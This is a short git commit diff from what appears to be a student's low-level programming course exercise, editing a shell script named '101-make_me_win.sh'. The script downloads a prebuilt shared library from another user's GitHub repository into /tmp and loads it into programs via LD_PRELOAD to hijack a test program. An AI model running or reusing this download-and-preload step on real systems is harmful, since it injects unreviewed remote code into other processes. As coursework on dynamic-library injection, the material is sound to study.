1de77573aa520d85e45f37c1af81f607196bf6cb
Val-Ster <vster310@gmail.com>
2023-12-13 16:24:43 -0800

    code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget -P /tmp https://raw.githubusercontent.com/Huclark/alx-low_level_programming/master/0x18-dynamic_libraries/libinj.so
-export LD_PRELOAD=/tmp/libinj.so/*if you would like to see anything about the code used, check the file location liste in the github*/
+export LD_PRELOAD=/tmp/libinj.so
